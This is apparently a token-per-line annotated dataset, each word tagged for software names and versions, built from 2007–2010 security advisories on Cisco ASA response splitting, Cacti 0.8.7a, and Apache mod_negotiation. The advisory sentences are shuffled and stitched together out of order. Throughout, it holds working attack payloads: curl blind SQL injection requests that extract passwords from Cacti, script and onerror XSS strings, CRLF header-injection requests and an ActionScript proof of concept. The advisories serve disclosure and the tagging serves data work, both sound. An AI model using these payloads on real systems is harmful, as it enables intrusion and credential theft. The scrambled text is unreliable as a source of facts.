Disclaimer O
Copyright O
xc2 O
xa9 O
2010 O
SecureWorks O
, O
Inc O
. O

SecureWorks O
Security O
Advisory O
SWRX-2010-001 O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O
Advisory O
Information O
Title O
: O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O
Advisory O
ID O
: O
SWRX-2010-001 O
Advisory O
URL O
: O
Date O
published O
: O
Thursday O
, O
June O
24 O
, O
2010 O
CVE O
: O
CVE-2008-7257 O
CVSS O
v2 O
Base O
Score O
: O
5 O
( O
Medium O
) O
( O
AV O
: O
N/AC O
: O
L/Au O
: O
N/C O
: O
N/I O
: O
P/A O
: O
N O
) O
Date O
of O
last O
update O
: O
Thursday O
, O
June O
24 O
, O
2010 O

Impact O
( O
scale O
of O
1-5 O
, O
with O
5 O
being O
high O
) O
: O
4 O

Leveraging O
our O
security O
technologies O
and O
a O
network O
of O
industry O
contacts O
, O
the O
CTU O
tracks O
leading O
hackers O
and O
analyzes O
anomalous O
activity O
, O
uncovering O
new O
attack O
techniques O
and O
threats O
. O

Positioned O
in O
the O
Leader O
Quadrant O
of O
Gartner O
Magic O
Quadrant O
for O
MSSPs O
, O
SecureWorks O
has O
been O
recognized O
by O
SC O
Magazine O
readers O
with O
the O
Best O
Managed O
Security O
Service O

award O
for O
2006 O
, O
2007 O
, O
2008 O
& O
2009 O
and O
has O
been O
named O
to O
the O
Inc. O
500 O
, O
Inc. O
5000 O
and O
Deloitte O
lists O
of O
fastest-growing O
companies O
. O

If O
you O
wish O
to O
reprint O
this O
advisory O
or O
any O
portion O
or O
element O
thereof O
, O
please O
contact O
ctu O
( O
at O
) O
secureworks O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
to O
seek O
permission O
. O

In O
no O
event O
shall O
SecureWorks O
be O
liable O
for O
any O
damages O
whatsoever O
arising O
out O
of O
or O
in O
connection O
with O
the O
use O
or O
spread O
of O
this O
information O
. O

This O
device O
is O
designed O
to O
be O
on O
the O
perimeter O
of O
a O
network O
to O
allow O
remote O
access O
. O

critical O
information O
assets O
. O

SecureWorks O
Risk O
Scoring O
Likelihood O
( O
scale O
of O
1-5 O
, O
with O
5 O
being O
high O
) O
: O
5 O

A O
remote O
attacker O
could O
exploit O
this O
vulnerability O
using O
a O
specially-crafted O
URL O
to O
execute O
script O
in O
a O
victim O
s O
web O
browser O
within O
the O
security O
context O
of O
the O
Adaptive O
Security O
Appliance O
site O
. O

Permission O
is O
hereby O
granted O
to O
link O
to O
this O
advisory O
via O
the O
SecureWorks O
website O
at O
or O
use O
in O
accordance O
with O
the O
fair O
use O
doctrine O
of O
U.S. O
copyright O
laws O
. O

If O
the O
client O
appends O
the O
carriage O
return O
( O
% O
0d O
) O
and O
line O
feed O
( O
% O
0a O
) O
characters O
to O
the O
URL O
, O
the O
web O
server O
will O
parse O
these O
and O
allow O
the O
client O
to O
inject O
arbitrary O
HTTP O
response O
headers O
. O

The O
web O
server O
issues O
a O
301 O
Moved O
Permanently O
status O
code O
to O
the O
connecting O
client O
to O
facilitate O
this O
redirection O
. O

Vendors O
contacted O
: O
Cisco O
Systems O
, O
Inc. O
Release O
mode O
: O
Coordinated O
release O
Discovered O
by O
: O
Daniel O
King O
, O
SecureWorks O
Summary O
Cisco O
Adaptive O
Security O
Appliance O
( O
ASA O
) O
is O
vulnerable O
to O
HTTP O
response O
splitting O
caused O
by O
improper O
validation O
of O
user-supplied O
input O
. O

Initial O
advisory O
release O
PGP O
Keys O
This O
advisory O
has O
been O
signed O
with O
the O
PGP O
key O
of O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
, O
which O
is O
available O
for O
download O
at O
About O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
Our O
expert O
team O
of O
threat O
researchers O
, O
also O
known O
as O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
, O
identifies O
and O
analyzes O
emerging O
threats O
and O
develops O
countermeasures O
, O
correlations O
and O
SOC O
processes O
to O
protect O
clients O

Upgrade O
to O
ASA O
software O
version O
8.1 O
( O
2 O
) O
to O
remediate O
this O
issue O
. O

The O
most O
recent O
version O
of O
this O
advisory O
may O
be O
found O
on O
the O
SecureWorks O
web O
site O
at O
for O
a O
limited O
period O
of O
time O
. O

Affected O
Products O
Cisco SN
ASA SN
version O
8.1 SV
( O
1 SV
) O
and SV
earlier SV
. O

This O
advisory O
may O
not O
be O
edited O
or O
modified O
in O
any O
way O
without O
the O
express O
written O
consent O
of O
SecureWorks O
, O
Inc O
. O

ANY O
USE O
OF O
THIS O
INFORMATION O
IS O
AT O
THE O
USER O
S O
RISK O
. O

The O
client O
web O
browser O
will O
act O
on O
only O
the O
last O
Location O
header O
it O
encounters O
and O
redirect O
there O
. O

Using O
this O
method O
, O
it O
is O
possible O
to O
inject O
a O
second O
Location O
header O
to O
the O
client O
. O

[ O
SWRX-2010-001 O
] O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O

CRLF O
injection O
vulnerability O
in O
SocialEngine SN
( O
SE SN
) O
2.7 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
PHPSESSID O
cookie O
. O

CRLF O
injection O
vulnerability O
in O
Ruby SN
on SN
Rails SN
before SV
2.0.5 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
to O
the O
redirect_to O
function O
. O

CRLF O
injection O
vulnerability O
in O
the O
WebContainer O
in O
IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
5.1.1.19 SV
and SV
earlier SV
5.1.x SV
versions O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
Cacti SN
0.8.7 SV
before SV
0.8.7b SV
and SV
0.8.6 SV
before SV
0.8.6k SV
, O
when O
running O
on O
older O
PHP O
interpreters O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

B O
) O
Path O
Disclosure O
Vulnerabilities O
The O
program O
checks O
the O
value O
of O
a O
non O
existent O
parameter O
. O

Follow O
an O
example O
of O
blind O
SQL O
injection O
( O
by O
an O
authenticated O
user O
) O
: O
ve O
& O
graph_list=bla O
% O
20or O
% O
20 O
1 O
= O
1 O
The O
following O
request O
needs O
admin O
permission O
to O
be O
executed O
, O
so O
it O
has O
limited O
impact O
: O
f_id=1 O
% O
20or O
% O
201 O
% O
20= O
% O
201 O
Same O
as O
above O
graph_xport.php O
is O
also O
vulnerable O
to O
an O
SQLi O
exploitable O
by O
authenticated O
users O
: O
curl O
-d O
local_graph_id=1 O
-H O
Cookie O
: O
Cacti= O
< O
cookie O
value O
> O
Also O
the O
program O
contains O
a O
serious O
logic O
flaw O
. O

Disclaimer O
: O
The O
information O
in O
the O
advisory O
is O
believed O
to O
be O
accurate O
at O
the O
time O
of O
publishing O
based O
on O
currently O
available O
information O
. O

Cacti SN
0.8.7a SV
Multiple O
Vulnerabilities O
Name O
Multiple O
Vulnerabilities O
in O
Cacti O
Systems O

The O
initial O
rows O
of O
the O
routine O
are O
: O
function O
set_tree_visibility_status O
( O
) O
{ O
if O
( O
! O
isset O
( O
$ O
_REQUEST O
[ O
subaction O
headers O
= O
db_fetch_assoc O
( O
SELECT O
graph_tree_id O
, O
order_key O
FROM O
graph_tree_items O
WHERE O
host_id= O
0 O
AND O
local_graph_id= O
0 O
AND O
graph_tree_id= O
. O

Vendor O
Advisory O
Author O
Francesco O
ascii O
Ongaro O
( O
ascii O
AT O
ush O
DOT O
it O
) O
Antonio O
s4tan O
Parata O
( O
s4tan O
AT O
ush O
DOT O
it O
) O
Date O
20071218 O
I O
. O

CVE O
INFORMATION O
No O
CVE O
at O
this O
time O
. O

BACKGROUND O
From O
the O
cacti O
web O
site O
: O
Cacti O
is O
a O
complete O
network O
graphing O
solution O
designed O
to O
harness O
the O
power O
of O
RRDTool O
data O
storage O
and O
graphing O
functionality O
. O

Summary O
: O
A O
) O
XSS O
Vulnerabilities O
graph.php O
( O
view_type O
parameter O
) O
graph_view.php O
( O
filter O
parameter O
) O
index.php/login O
( O
action O
parameter O
) O
index.php/login O
( O
login_username O
parmeter O
) O
B O
) O
Path O
Disclosure O
Vulnerabilities O
graph.php O
( O
local_graph_id O
parameter O
) O
C O
) O
SQL O
Injection O
Vulnerabilities O
graph_view.php O
( O
graph_list O
parameter O
) O
tree.php O
( O
leaf_id O
parameter O
) O
graph_xport.php O
( O
local_graph_id O
parameter O
) O
tree.php O
( O
id O
parameter O
) O
index.php/login O
( O
login_username O
parameter O
) O
D O
) O
HTTP O
response O
splitting O
on O
very O
old O
PHP O
instances O
A O
) O
XSS O
Vulnerabilities O

$ O
_REQUEST O
[ O
id O
] O
. O

An O
SQL O
injection O
vulnerability O
exists O
in O
the O
authentication O
method O
( O
the O
attacker O
doesn O
t O
need O
to O
be O
authenticated O
in O
order O
to O
exploit O
it O
) O
. O

Francesco O
ascii O
Ongaro O
web O
site O
: O
mail O
: O
ascii O
AT O
ush O
DOT O
it O
Antonio O
s4tan O
Parata O
web O
site O
: O
mail O
: O
s4tan O
AT O
ictsc O
DOT O
it O
, O
s4tan O
AT O
ush O
DOT O
it O
X O
. O

Suppose O
we O
know O
that O
exists O
the O
user O
name O
cacti O
, O
to O
know O
if O
it O
is O
an O
administrator O
we O
send O
the O
following O
request O
: O
curl O
-v O
-d O
login_username=cacti O
& O
action=login O
If O
a O
302 O
response O
code O
with O
Location O
index.php O
is O
returned O
then O
it O
is O
the O
administrator O
, O
in O
the O
other O
case O
with O
a O
Location O
of O
graph_view.php O
we O
have O
discovered O
a O
normal O
user O
. O

VENDOR O
RESPONSE O

Affected O
Cacti SN
0.8.7a SV
and SV
possibly SV
earlier SV
versions O
Severity O
High O
Impact O
( O
CVSSv2 O
) O
High O
( O
9/10 O
, O
vector O
: O
AV O
: O
N/AC O
: O
L/Au O
: O
N/C O
: O
C/I O
: O
P/A O
: O
P O
) O

DETECTION O
Cacti SN
0.8.7a SV
and SV
possibly SV
earlier SV
versions O
are O
vulnerable O
. O

One O
example O
of O
this O
vulnerability O
is O
shown O
by O
the O
following O
url O
: O
curl O
-d O
id=sql O
-H O
Cookie O
: O
Cacti= O
< O
cookie O
value O
> O
One O
of O
these O
vulnerable O
code O
is O
in O
the O
set_tree_visibility_status O
( O
) O
function O
in O
file O
lib/html_tree.php O
. O

DISCLOSURE O
TIMELINE O
20071113 O
Bug O
discovered O
20071218 O

Magic O
quotes O
ON O
will O
protect O
you O
against O
the O
most O
serious O
unauthenticated O
SQLi O
vulnerabilities O
and O
possibly O
other O
. O

This O
causes O
an O
SQL O
Injection O
attack O
possible O
. O

This O
produces O
an O
error O
that O
discloses O
the O
absolute O
installation O
path O
: O
Other O
vulnerable O
code O
exists O
since O
in O
Cacti O
PHP O
errors O
are O
displayed O
as O
they O
are O
, O
with O
no O
custom O
error O
handler O
. O

After O
this O
validation O
routine O
, O
the O
value O
of O
the O
input O
is O
used O
to O
create O
an O
SQL O
query O
, O
obtaining O
the O
value O
from O
the O
$ O
_REQUEST O
variable O
. O

The O
check O
is O
done O
with O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
. O

The O
program O
presents O
many O
input O
check O
routines O
, O
however O
some O
of O
these O
routines O
validate O
only O
the O
$ O
_GET O
variable O
. O

DESCRIPTION O
Multiple O
vulnerabilities O
exist O
in O
Cacti O
software O
( O
XSS O
, O
SQL O
Injection O
, O
Path O
Disclosure O
, O
HTTP O
Response O
Splitting O
) O
. O

C O
) O
SQL O
Injection O
Vulnerabilities O
There O
are O
some O
points O
in O
the O
program O
that O
don O
t O
check O
the O
input O
parameters O
. O

It O
may O
not O
be O
edited O
in O
any O
way O
without O
mine O
express O
written O
consent O
. O

But O
take O
a O
look O
at O
the O
if O
statement O
: O
if O
( O
( O
! O
in_array O
( O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
, O
$ O
no_http_header_files O
, O
true O
SERVER O
[ O
PHP_SELF O
The O
branch O
is O
not O
taken O
if O
we O
are O
calling O
a O
function O
that O
is O
present O
in O
$ O
no_http_header_files O
variable O
defined O
at O
line O
53 O
. O

We O
can O
also O
discovery O
the O
user O
name O
at O
the O
same O
way O
. O

Last O
but O
not O
least O
we O
show O
the O
most O
critical O
vulnerability O
. O

Vendor O
issued O
new O
version O
0.8.7b O
and O
0.8.6k O
to O
address O
the O
vulnerabilities O
available O
for O
download O
at O
following O
urls O
: O
Patches O
are O
also O
available O
: O
VII O
. O

Vendor O
contacted O
20080212 O
Advisory O
released O
IX O
. O

We O
have O
found O
many O
XSS O
vulnerabilities O
in O
the O
application O
. O

There O
are O
no O
warranties O
with O
regard O
to O
this O
information O
. O

The O
initial O
rows O
of O
the O
tree_edit O
( O
) O
routine O
are O
: O
function O
tree_edit O
( O
) O
{ O
global O
$ O
colors O
, O
$ O
fields_tree_edit O
; O
input O
validation O
input_validate_input_number O
( O
get_request_var O
( O
id O
The O
input_validate_input_number O
routine O
correctly O
validate O
the O
parameter O
, O
but O
the O
problem O
is O
that O
get_request_var O
routine O
returns O
the O
$ O
_GET O
value O
, O
as O
the O
following O
code O
show O
: O
function O
get_request_var O
( O
$ O
name O
, O
$ O
default O
if O
( O
isset O
( O
$ O
_GET O
[ O
$ O
name O
] O
) O
) O
{ O
return O
$ O
_GET O
[ O
$ O
name O
] O
; O
} O
else O
{ O
return O
$ O
default O
; O
} O
} O
So O
we O
can O
send O
our O
injection O
string O
in O
POST O
data O
( O
to O
skip O
the O
check O
) O
, O
and O
our O
value O
will O
be O
used O
because O
it O
has O
precedence O
over O
GET O
in O
the O
$ O
_REQUEST O
variable O
. O

) O
; O
The O
set_tree_visibility_status O
( O
) O
is O
called O
in O
grow_edit_graph_tree O
( O
$ O
tree_id O
, O
$ O
user_id O
, O
$ O
options O
) O
function O
. O

According O
to O
the O
PHP O
specifications O
, O
the O
$ O
_REQUEST O
variable O
looks O
for O
the O
value O
of O
the O
parameters O
in O
the O
following O
order O
: O
cookie O
, O
post O
data O
, O
get O
data O
. O

The O
following O
request O
is O
an O
example O
of O
blind O
SQL O
injection O
attack O
by O
inference O
: O
curl O
-v O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
> O
56 O
& O
action=login O
If O
this O
query O
succeeds O
then O
a O
302 O
response O
code O
is O
sent O
in O
the O
response O
. O

The O
grow_edit_graph_tree O
( O
$ O
tree_id O
, O
$ O
user_id O
, O
$ O
options O
) O
is O
called O
in O
tree.php O
file O
by O
the O
tree_edit O
( O
) O
routine O
which O
is O
called O
from O
the O
main O
code O
. O

V. O
WORKAROUND O
Proper O
input O
validation O
will O
fix O
the O
vulnerabilities O
. O

Neither O
the O
author O
nor O
the O
publisher O
accepts O
any O
liability O
for O
any O
direct O
, O
indirect O
, O
or O
consequential O
loss O
or O
damage O
arising O
from O
use O
of O
, O
or O
reliance O
on O
, O
this O
information O
. O

CREDIT O
Francesco O
ascii O
Ongaro O
and O
Antonio O
s4tan O
Parata O
are O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

If O
we O
specify O
the O
injection O
string O
in O
the O
cookie O
data O
or O
in O
the O
post O
data O
, O
then O
we O
can O
bypass O
the O
validation O
routine O
. O

Use O
of O
the O
information O
constitutes O
acceptance O
for O
use O
in O
an O
AS O
IS O
condition O
. O

Again O
: O
this O
vulnerability O
is O
exploitable O
ONLY O
with O
magic O
quotes O
OFF O
and O
any O
value O
of O
register O
globals O
. O

Cacti O
provides O
a O
fast O
poller O
, O
advanced O
graph O
templating O
, O
multiple O
data O
acquisition O
methods O
, O
and O
user O
management O
features O
out O
of O
the O
box O
. O

We O
list O
some O
examples O
only O
, O
but O
many O
other O
injection O
points O
exist O
: O
=properties O
& O
view_type=token O
% O
3E O
% O
3Cscript O
% O
3Ealert O
( O
document.cookie O
) O
% O
3C/scr O
ipt O
% O
3E O
The O
following O
example O
will O
execute O
the O
code O
when O
the O
user O
clicks O
on O
the O
menu O
list O
: O
& O
graph_template_id=8 O
& O
filter=onmouseover=javascript O
: O
alert O
( O
/XSS/ O
) O
Also O
XSS O
vulnerabilities O
exist O
in O
the O
login O
page O
, O
where O
we O
authentication O
isn O
t O
needed O
: O
) O
% O
3C/script O
% O
3E O
In O
addition O
if O
we O
enter O
as O
user O
name O
: O
> O
< O
script O
> O
alert O
( O
/XSS/ O
) O
; O
< O
/script O
> O
, O
then O
we O
have O
another O
XSS O
. O

Well O
, O
if O
we O
set O
a O
URL O
like O
( O
sql.php O
is O
an O
entry O
in O
the O
$ O
no_http_header_files O
variable O
) O
then O
the O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
will O
return O
sql.php O
and O
we O
happly O
bypass O
the O
magic O
quote O
check O
: O
) O
However O
a O
complete O
authentication O
bypass O
can O
not O
be O
possible O
because O
the O
code O
that O
starts O
the O
session O
is O
in O
the O
chunk O
of O
code O
that O
we O
skip O
, O
so O
no O
$ O
_SESSION O
variable O
will O
be O
created O
and O
we O
are O
unable O
to O
bypass O
the O
following O
check O
at O
file O
auth.php O
: O
if O
( O
empty O
( O
$ O
_SESSION O
[ O
sess_user_id O
include O
( O
./auth_login.php O
) O
; O
exit O
; O
However O
it O
is O
possible O
to O
extract O
the O
password O
and O
user O
name O
from O
the O
DB O
by O
an O
SQL O
injection O
inference O
attack O
. O

There O
is O
also O
a O
nice O
trick O
that O
allows O
us O
to O
know O
if O
we O
have O
discovered O
the O
administrator O
user O
. O

However O
this O
attack O
is O
mitigated O
by O
the O
PHP O
framework O
that O
doesn O
t O
permits O
CR O
or O
LF O
injection O
anymore O
in O
the O
header O
function O
. O

If O
you O
wish O
to O
reprint O
the O
whole O
or O
any O
part O
of O
this O
alert O
in O
any O
other O
medium O
other O
than O
electronically O
, O
please O
email O
me O
for O
permission O
. O

$ O
curl O
-v O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
< O
56 O
& O
action=login O
About O
to O
connect O
( O
) O
to O
port O
80 O
( O
0 O
) O
Trying O
127.0.0.1 O
... O
connected O
Connected O
to O
( O
127.0.0.1 O
) O
port O
80 O
( O
0 O
) O
POST O
/cacti-0.8.7a/index.php/sql.php O
HTTP/1.1 O
User-Agent O
: O
curl/1.1.1 O
( O
i986-gnu-ms-bsd O
) O
cacalib/3.6.9 O
OpenTelnet/0.1 O
Host O
: O
Accept O
: O
Content-Length O
: O
71 O
Content-Type O
: O
application/x-www-form-urlencoded O
< O
HTTP/1.1 O
200 O
OK O
< O
Date O
: O
Mon O
, O
17 O
Dec O
2007 O
19:29:34 O
GMT O
< O
Server O
: O
Apache O
< O
X-Powered-By O
: O
PHP/1.2.3-linuxz O
< O
Content-Length O
: O
355 O
< O
Content-Type O
: O
text/html O
< O
AAAAAAAAA O
: O
SELECT O
FROM O
user_auth O
WHERE O
username O
= O
foo O
or O
ascii O
( O
substring O
( O
password,1,1 O
) O
) O
< O
56 O
AND O
password O
= O
md5 O
AND O
realm=0 O
< O
br O
< O
b O
> O
Warning O
< O
/b O
> O
: O
Can O
not O
modify O
header O
information O
- O
headers O
already O
sent O
by O
( O
output O
started O
at O
/home/x/cacti-0.8.7a/auth_login.php:126 O
) O
in O
< O
b O
> O
/home/x/cacti-0.8.7a/auth_login.php O
< O
/b O
on O
line O
< O
b O
> O
200 O
< O
/b O
> O
< O
br O
Connection O
0 O
to O
host O
left O
intact O
Closing O
connection O
0 O
This O
vulnerability O
can O
be O
obviously O
exploited O
as O
follows O
$ O
curl O
-kis O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
> O
56 O
& O
action=login O
| O
head O
-n1 O

In O
file O
global.php O
at O
line O
109 O
we O
have O
an O
if O
statement O
that O
if O
true O
detects O
if O
magic O
quote O
is O
off O
, O
if O
it O
off O
then O
it O
simulates O
it O
by O
calling O
addslashes O
( O
) O
function O
. O

LEGAL O
NOTICES O
Copyright O
( O
c O
) O
2007 O
Francesco O
ascii O
Ongaro O
Permission O
is O
granted O
for O
the O
redistribution O
of O
this O
alert O
electronically O
. O

Cacti SN
0.8.7a SV
Multiple O
Vulnerabilities O

Affected O
packages O
: O
cacti SN
< SV
0.8.7b SV
Multiple O
security O
vulnerabilities O
have O
been O
discovered O
in O
Cacti O
web O
interface O
: O
XSS O
vulnerabilities O
Path O
disclosure O
vulnerabilities O
SQL O
injection O
vulnerabilities O
HTTP O
response O
splitting O
vulnerabilities O
References O
: O
Mario O
Sergio O
Candian O
- O
Live O
your O
dreams O
and O
face O
your O
fears O

cacti O
Multiple O
security O
vulnerabilities O
have O
been O
discovered O

CRLF O
injection O
vulnerability O
in O
the O
mod_negotiation O
in O
the O
Apache SN
HTTP SN
Server SN
2.2.6 SV
and SV
earlier SV
in O
the O
2.2.x SV
series O
, O
2.0.61 SV
and SV
earlier SV
in O
the O
2.0.x SV
series O
, O
and O
1.3.39 SV
and SV
earlier SV
in O
the O
1.3.x SV
series O
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
by O
uploading O
a O
file O
with O
a O
multi-line O
name O
containing O
HTTP O
header O
sequences O
and O
a O
file O
extension O
, O
which O
leads O
to O
injection O
within O
a O
( O
1 O
) O
406 O
Not O
Acceptable O
or O
( O
2 O
) O
300 O
Multiple O
Choices O
HTTP O
response O
when O
the O
extension O
is O
omitted O
in O
a O
request O
for O
the O
file O
. O

blah O
: O
.jpg O
1 O
{ O
type O
image/jpeg O
} O
{ O
length O
2 O
} O
} O
Vary O
: O
negotiate O
TCN O
: O
list O
Content-Length O
: O
508 O
Content-Type O
: O
text/html O
; O
charset=iso-8859-1 O
< O
! O
DOCTYPE O
HTML O
PUBLIC O
- O
IETF O
DTD O
HTML O
2.0 O
EN O
< O
html O
> O
< O
head O
< O
title O
> O
406 O
Not O
Acceptable O
< O
/title O
< O
/head O
> O
< O
body O
< O
h1 O
> O
Not O
Acceptable O
< O
/h1 O
< O
p O
> O
An O
appropriate O
representation O
of O
the O
requested O
resource O
/junk O
Header O
: O
Injected O
blah O
: O
could O
not O
be O
found O
on O
this O
server. O
< O
/p O
Available O
variants O
: O
< O
ul O
< O
li O
> O
< O
a O
href= O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
> O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
< O
/a O
, O
type O
image/jpeg O
< O
/li O
< O
/ul O
< O
hr O
< O
address O
> O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Server O
at O
127.0.0.1 O
Port O
80 O
< O
/address O
< O
/body O
> O
< O
/html O
As O
it O
could O
be O
noted O
, O
the O
header O
response O
is O
splitted O
and O
Header O
: O
Injected O
is O
, O
indeed O
injected O
. O

Permission O
is O
hereby O
granted O
for O
the O
redistribution O
of O
this O
Alert O
electronically O
. O

In O
no O
event O
shall O
the O
author O
be O
liable O
for O
any O
damages O
whatsoever O
arising O
out O
of O
or O
in O
connection O
with O
the O
use O
or O
spread O
of O
this O
information O
. O

Http O
Response O
Splitting O
By O
using O
a O
similar O
technique O
, O
Http O
Response O
Splitting O
could O
be O
triggered O
if O
there O
some O
way O
to O
set O
the O
name O
of O
the O
file O
like O
the O
following O
: O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
Then O
, O
by O
requesting O
the O
urlencoded O
file O
name O
: O
GET O
/junk O
% O
0aHeader O
: O
% O
20Injected O
% O
0ablah O
: O
HTTP/1.1 O
Host O
: O
127.0.0.1 O
Accept O
: O
image/jpeg O
; O
q=0 O
HTTP/1.1 O
406 O
Not O
Acceptable O
Date O
: O
Tue O
, O
15 O
Jan O
2008 O
16:06:52 O
GMT O
Server O
: O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Alternates O
: O
{ O
junk O
Header O
: O
Injected O
< O
Here O
! O

[ O
Proof O
of O
Concept O
] O
The O
following O
actionscript O
can O
be O
used O
in O
order O
to O
trigger O
the O
Xss O
. O

Any O
use O
of O
this O
information O
is O
at O
the O
user O
own O
risk O
. O

Moreover O
, O
as O
the O
list O
of O
the O
filenames O
is O
also O
sent O
, O
without O
being O
sanitized O
, O
in O
the O
response O
header O
, O
it O
could O
result O
in O
a O
Http O
Response O
Splitting O
issue O
if O
the O
name O
of O
the O
file O
contains O
( O
Line O
Feed O
) O
. O

Tested O
Versions O
: O
Apache SN
< SV
=1.3.39 SV
< SV
= SV
2.0.61 SV
< SV
= SV
2.2.6 SV
Minded O
Security O
ReferenceID O
: O
MSA01150108 O
Credits O
: O
Discovery O
by O
Stefano O
Di O
Paola O
of O
Minded O
Security O
stefano.dipaola O
[ O
_at_ O
] O
mindedsecurity.com O
Severity O
: O
Low/Medium O
Permalink O
: O
[ O
Background O
] O
> O
From O
Apache O
Mod_Negotiation O
page O
: O
Content O
negotiation O
, O
or O
more O
accurately O
content O
selection O
, O
is O
the O
selection O
of O
the O
document O
that O
best O
matches O
the O
clients O
capabilities O
, O
from O
one O
of O
several O
available O
documents O
. O

Research O
Labs O
Minded O
Security O
S.r.l O
. O

public O
class O
TestXss O
extends O
flash.display.Sprite O
{ O
public O
function O
TestXss O
( O
) O
{ O
var O
r O
: O
URLRequest O
= O
new O
URLRequest O
( O
20onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
alert O
( O
123 O
) O
) O
; O
r.method O
= O
POST O
; O
r.data O
= O
unescape O
( O
test O
) O
; O
r.requestHeaders.push O
( O
new O
URLRequestHeader O
( O
Accept O
, O
image/jpeg O
; O
q=0 O
) O
) O
; O
navigateToURL O
( O
r O
, O
_self O
Credits O
] O
Stefano O
di O
Paola O
is O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

[ O
Summary O
] O
Mod_negotiation O
doesn O
t O
sanitize O
filenames O
in O
406 O
Not O
Acceptable O
response O
and O
300 O
Multiple O
Choices O
message O
body O
. O

There O
are O
NO O
warranties O
with O
regard O
to O
this O
information O
. O

Cross O
Site O
Scripting O
Let O
suppose O
mod_negotiation O
is O
enabled O
and O
an O
attacker O
could O
upload O
a O
file O
with O
arbitrary O
name O
and O
whatever O
mime O
extension O
. O

[ O
Disclosure O
Timeline O
] O
15/01/2008 O
Initial O
vendor O
notification O
16/01/2008 O

This O
could O
lead O
to O
Xss O
if O
the O
name O
of O
the O
file O
is O
controlled O
by O
an O
attacker O
( O
i.e O
. O

There O
are O
two O
implementations O
of O
this O
. O

Apache O
mod_negotiation O
Xss O
and O
Http O
Response O
Splitting O
Date O
: O
January O
22th O
, O
2008 O

Web O
: O
Mail O
: O
research_at_mindedsecurity.com O

[ O
Analysis O
] O
I O
. O

For O
example O
a O
legit O
jpeg O
file O
named O
: O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
> O
.jpg O
Then O
by O
requesting O
it O
without O
extension O
with O
Accept O
header O
set O
to O
image/jpeg O
; O
q=0 O
, O
GET O
< O
img O
% O
20src=sa O
% O
20onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
HTTP/1.1 O
Host O
: O
127.0.0.1 O
Accept O
: O
image/jpeg O
; O
q=0 O
HTTP/1.1 O
406 O
Not O
Acceptable O
Date O
: O
Tue O
, O
15 O
Jan O
2008 O
15:43:11 O
GMT O
Server O
: O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Alternates O
: O
{ O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
> O
.jpg O
1 O
{ O
type O
image/jpeg O
} O
{ O
length O
2 O
} O
} O
Vary O
: O
negotiate O
TCN O
: O
list O
Content-Length O
: O
610 O
Content-Type O
: O
text/html O
; O
charset=iso-8859-1 O
< O
! O
DOCTYPE O
HTML O
PUBLIC O
- O
IETF O
DTD O
HTML O
2.0 O
EN O
< O
html O
> O
< O
head O
< O
title O
> O
406 O
Not O
Acceptable O
< O
/title O
< O
/head O
> O
< O
body O
< O
h1 O
> O
Not O
Acceptable O
< O
/h1 O
< O
p O
> O
An O
appropriate O
representation O
of O
the O
requested O
resource O
/ O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
could O
not O
be O
found O
on O
this O
server. O
< O
/p O
Available O
variants O
: O
< O
ul O
< O
li O
> O
< O
a O
href= O
< O
img O
src=sa O
onerror=eval O
( O

Tested O
on O
IE SN
7 SV
and O
FF SN
2.0.11 SV
, O
Flash SN
9.0 SV
r115 SV
Compile O
with O
flex O
compiler O
package O
{ O
import O
flash.display.Sprite O
; O
import O
flash.net O
. O

If O
you O
wish O
to O
reprint O
the O
whole O
or O
any O
part O
of O
this O
Alert O
in O
any O
other O
medium O
excluding O
electronic O
medium O
, O
please O
e-mail O
research O
( O
at O
) O
mindedsecurity O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
for O
permission O
. O

by O
previously O
uploading O
it O
) O
. O

A O
type O
map O
( O
a O
file O
with O
the O
handler O
type-map O
) O
which O
explicitly O
lists O
the O
files O
containing O
the O
variants O
. O

A O
MultiViews O
search O
( O
enabled O
by O
the O
MultiViews O
Option O
, O
where O
the O
server O
does O
an O
implicit O
filename O
pattern O
match O
, O
and O
choose O
from O
amongst O
the O
results O
. O

It O
is O
not O
to O
